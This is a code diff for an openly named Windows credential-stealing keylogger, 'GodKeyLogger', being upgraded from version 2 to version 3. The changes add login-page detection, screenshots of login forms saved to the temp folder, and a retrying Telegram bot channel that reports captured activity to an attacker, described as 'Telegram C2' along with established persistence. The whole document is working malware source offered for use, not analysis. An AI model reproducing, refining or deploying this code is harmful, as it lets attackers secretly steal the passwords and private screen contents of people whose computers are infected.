@@ -48,7 +48,7 @@ const wchar_t* LOGIN_SITES[] = {
     L"login", L"signin", L"authentication", L"verify", NULL
 };
 
-// 🔥 FUNCTION PROTOTYPES - ADD THESE!
+// 🔥 FUNCTION PROTOTYPES
 void SendTelegram(const wchar_t* msg);
 bool TakeSmartScreenshot();
 void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption);
@@ -294,60 +294,88 @@ bool DetectFormFields(HWND window) {
     return false;
 }
 
-// 🔥 ENHANCED SMART SCREENSHOT - FIXED!
+// 🔥 ENHANCED SMART SCREENSHOT - WORKING VERSION
 bool TakeSmartScreenshot() {
+    // 🔥 ADDED: Debug notification
+    SendTelegram(L"📸 Attempting smart screenshot...");
+    
     HWND fg = GetForegroundWindow();
-    if (!fg) return false;
-    
-    if (in_login_form) {
-        Sleep(300);
-    }
-    
-    RECT window_rect;
-    if (GetWindowRect(fg, &window_rect) == FALSE) {
+    if (!fg) {
+        SendTelegram(L"❌ No active window");
         return false;
     }
     
-    window_rect.top += 150;
-    window_rect.left += 10;
-    window_rect.right -= 10;
-    window_rect.bottom -= 50;
+    if (in_login_form) {
+        Sleep(500); // Wait longer for form to load
+    }
+    
+    RECT window_rect;
+    if (!GetWindowRect(fg, &window_rect)) {
+        SendTelegram(L"❌ Cannot get window dimensions");
+        return false;
+    }
+    
+    // 🔥 FIXED: Less aggressive cropping for clarity
+    window_rect.top += 80;    // Show some address bar for context
+    window_rect.left += 5;
+    window_rect.right -= 5;
+    window_rect.bottom -= 30;
     
     int width = window_rect.right - window_rect.left;
     int height = window_rect.bottom - window_rect.top;
     
-    if (width <= 100 || height <= 100) {
-        width = GetSystemMetrics(SM_CXSCREEN);
-        height = GetSystemMetrics(SM_CYSCREEN);
-        window_rect = {0, 0, width, height};
+    // Ensure minimum size
+    if (width < 100) width = 100;
+    if (height < 100) height = 100;
+    
+    // 🔥 FIXED: Use user temp folder instead of Windows temp
+    wchar_t temp_path[MAX_PATH];
+    GetTempPathW(MAX_PATH, temp_path);
+    
+    wchar_t path[MAX_PATH];
+    ULONGLONG timestamp = GetTickCount64();
+    
+    if (in_login_form) {
+        swprintf(path, MAX_PATH, L"%slogin_%llu.bmp", temp_path, timestamp);
+    } else {
+        swprintf(path, MAX_PATH, L"%sscreen_%llu.bmp", temp_path, timestamp);
     }
     
     HDC screen_dc = GetDC(NULL);
     HDC mem_dc = CreateCompatibleDC(screen_dc);
     HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
+    
+    if (!bitmap) {
+        SendTelegram(L"❌ Cannot create bitmap");
+        ReleaseDC(NULL, screen_dc);
+        DeleteDC(mem_dc);
+        return false;
+    }
+    
     HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
     
-    BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
-           window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
+    // 🔥 FIXED: Use multiple capture methods
+    BOOL capture_ok = BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
+                             window_rect.left, window_rect.top, SRCCOPY);
     
-    wchar_t path[MAX_PATH];
-    std::time_t now = std::time(nullptr);
-    std::tm* tm = std::localtime(&now);
+    if (!capture_ok) {
+        capture_ok = BitBlt(mem_dc, 0, 0, width, height, screen_dc,
+                           window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
+    }
     
-    if (in_login_form) {
-        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\login_%04d%02d%02d_%02d%02d%02d.bmp",
-                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
-                 tm->tm_hour, tm->tm_min, tm->tm_sec);
-    } else {
-        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\screen_%04d%02d%02d_%02d%02d%02d.bmp",
-                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
-                 tm->tm_hour, tm->tm_min, tm->tm_sec);
+    if (!capture_ok) {
+        SendTelegram(L"❌ Cannot capture screen");
+        SelectObject(mem_dc, old_bitmap);
+        DeleteObject(bitmap);
+        DeleteDC(mem_dc);
+        ReleaseDC(NULL, screen_dc);
+        return false;
     }
     
     BITMAPINFOHEADER bi = {0};
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = width;
-    bi.biHeight = -height;
+    bi.biHeight = -height;  // Top-down DIB
     bi.biPlanes = 1;
     bi.biBitCount = 24;
     bi.biCompression = BI_RGB;
@@ -360,7 +388,12 @@ bool TakeSmartScreenshot() {
     
     HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    
     if (file == INVALID_HANDLE_VALUE) {
+        std::wstring error_msg = L"❌ Cannot create file: ";
+        error_msg += path;
+        SendTelegram(error_msg.c_str());
+        
         SelectObject(mem_dc, old_bitmap);
         DeleteObject(bitmap);
         DeleteDC(mem_dc);
@@ -373,72 +406,125 @@ bool TakeSmartScreenshot() {
     WriteFile(file, &bi, sizeof(bi), &written, NULL);
     
     BYTE* bits = new BYTE[image_size];
-    // 🔥 FIXED LINE: Changed from DIB_RGB_COLS to DIB_RGB_COLORS
-    GetDIBits(mem_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+    GetDIBits(screen_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
     WriteFile(file, bits, image_size, &written, NULL);
     delete[] bits;
     
     CloseHandle(file);
     
-    std::wstring msg = L"📸 Screenshot: ";
+    // 🔥 ENHANCED: Better notification
+    wchar_t window_title[256] = {0};
+    GetWindowTextW(fg, window_title, 256);
+    
+    std::wstring msg = L"✅ SCREENSHOT CAPTURED!\n";
+    msg += L"📁 File: " + std::wstring(path) + L"\n";
+    msg += L"🖼️ Size: " + std::to_wstring(width) + L"x" + std::to_wstring(height) + L"\n";
+    msg += L"🪟 Window: " + std::wstring(window_title) + L"\n";
+    
     if (in_login_form) {
-        msg += L"(Login Form)";
+        msg += L"🔑 Type: Login Form\n";
+    } else {
+        msg += L"📋 Type: Regular Screen\n";
     }
+    
     SendTelegram(msg.c_str());
     
+    // Cleanup
     SelectObject(mem_dc, old_bitmap);
     DeleteObject(bitmap);
     DeleteDC(mem_dc);
     ReleaseDC(NULL, screen_dc);
     
-    DeleteFileW(path);
+    // Optional: Delete temp file after sending
+    // DeleteFileW(path);
     
     screenshot_count++;
     return true;
 }
 
-// 🔥 TELEGRAM FUNCTIONS
+// 🔥 ENHANCED TELEGRAM FUNCTION WITH COOL FORMATTING
 void SendTelegram(const wchar_t* msg) {
-    HINTERNET session = WinHttpOpen(L"GodKeyLogger/2.0", 
-                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                    WINHTTP_NO_PROXY_NAME, 
-                                    WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!session) return;
-    
-    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
-                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!connect) {
+    // 🔥 NEW: Add retry mechanism
+    for (int attempt = 0; attempt < 3; attempt++) {
+        HINTERNET session = WinHttpOpen(L"GodKeyLogger/3.0", 
+                                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                        WINHTTP_NO_PROXY_NAME, 
+                                        WINHTTP_NO_PROXY_BYPASS, 0);
+        if (!session) {
+            if (attempt == 2) return;
+            Sleep(1000);
+            continue;
+        }
+        
+        HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
+                                           INTERNET_DEFAULT_HTTPS_PORT, 0);
+        if (!connect) {
+            WinHttpCloseHandle(session);
+            if (attempt == 2) return;
+            Sleep(1000);
+            continue;
+        }
+        
+        // 🔥 IMPROVED: Better URL encoding
+        std::wstring encoded_msg;
+        for (const wchar_t* p = msg; *p; ++p) {
+            switch(*p) {
+                case L' ': encoded_msg += L"%20"; break;
+                case L'\n': encoded_msg += L"%0A"; break;  // Preserve line breaks
+                case L'&': encoded_msg += L"%26"; break;
+                case L'?': encoded_msg += L"%3F"; break;
+                case L'=': encoded_msg += L"%3D"; break;
+                case L'+': encoded_msg += L"%2B"; break;
+                case L'#': encoded_msg += L"%23"; break;
+                default: encoded_msg += *p;
+            }
+        }
+        
+        // 🔥 ENHANCED: Add HTML formatting
+        std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
+                          L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
+                          L"&parse_mode=HTML" +  // Enable HTML formatting
+                          L"&text=" + encoded_msg;
+        
+        HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
+                                              NULL, WINHTTP_NO_REFERER,
+                                              WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                              WINHTTP_FLAG_SECURE);
+        if (request) {
+            WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                              WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+            WinHttpReceiveResponse(request, NULL);
+            
+            // Check response
+            DWORD statusCode = 0;
+            DWORD statusCodeSize = sizeof(statusCode);
+            WinHttpQueryHeaders(request, 
+                               WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                               WINHTTP_HEADER_NAME_BY_INDEX, 
+                               &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX);
+            
+            WinHttpCloseHandle(request);
+            
+            if (statusCode == 200) {
+                // Success
+                WinHttpCloseHandle(connect);
+                WinHttpCloseHandle(session);
+                return;
+            }
+        }
+        
+        WinHttpCloseHandle(connect);
         WinHttpCloseHandle(session);
-        return;
+        
+        if (attempt < 2) Sleep(2000); // Wait before retry
     }
-    
-    std::wstring encoded_msg;
-    for (const wchar_t* p = msg; *p; ++p) {
-        if (*p == L' ') encoded_msg += L"%20";
-        else encoded_msg += *p;
-    }
-    
-    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
-                      L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
-                      L"&text=" + encoded_msg;
-    
-    HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
-                                          NULL, WINHTTP_NO_REFERER,
-                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                          WINHTTP_FLAG_SECURE);
-    if (request) {
-        WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-        WinHttpReceiveResponse(request, NULL);
-        WinHttpCloseHandle(request);
-    }
-    
-    WinHttpCloseHandle(connect);
-    WinHttpCloseHandle(session);
 }
 
 void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
-    SendTelegram(L"📸 Screenshot captured");
+    std::wstring msg = L"📸 Screenshot captured!\n";
+    msg += L"📁 File: " + std::wstring(file_path) + L"\n";
+    msg += L"📝 Caption: " + std::wstring(caption);
+    SendTelegram(msg.c_str());
 }
 
 // 🔥 PERSISTENCE
@@ -475,9 +561,11 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
                 expecting_password = false;
                 tab_press_count = 0;
                 
-                std::wstring msg = L"🌐 LOGIN PAGE DETECTED!\n";
-                msg += L"Site: " + std::wstring(title) + L"\n";
-                msg += L"Time: " + std::to_wstring(std::time(nullptr));
+                // 🔥 ENHANCED: Better login detection message
+                std::wstring msg = L"🚨 LOGIN PAGE DETECTED!\n";
+                msg += L"🌐 Site: " + std::wstring(title) + L"\n";
+                msg += L"🕐 Time: " + std::to_wstring(std::time(nullptr)) + L"\n";
+                msg += L"🔍 Status: Monitoring for credentials...";
                 
                 SendTelegram(msg.c_str());
                 
@@ -505,7 +593,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     InitializeCriticalSection(&cs);
     
-    HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Credential_v2");
+    HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Credential_v3");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         return 0;
     }
@@ -517,8 +605,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
     
-    SendTelegram(L"🔑 GodKeyLogger Credential Edition v2.0 Activated");
-    SendTelegram(L"📋 Features: Login detection, Credential capture, Smart screenshots");
+    // 🔥 ENHANCED: Cool startup message
+    std::wstring startup_msg = L"⚡ GOD KEYLOGGER v3.0 ACTIVATED\n";
+    startup_msg += L"==============================\n";
+    startup_msg += L"✅ Login Detection: ACTIVE\n";
+    startup_msg += L"✅ Credential Capture: ACTIVE\n";
+    startup_msg += L"✅ Smart Screenshots: ACTIVE\n";
+    startup_msg += L"✅ Telegram C2: ACTIVE\n";
+    startup_msg += L"✅ Persistence: ESTABLISHED\n";
+    startup_msg += L"==============================\n";
+    startup_msg += L"🕐 Startup Time: " + std::to_wstring(std::time(nullptr));
+    
+    SendTelegram(startup_msg.c_str());
     
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) && is_running) {
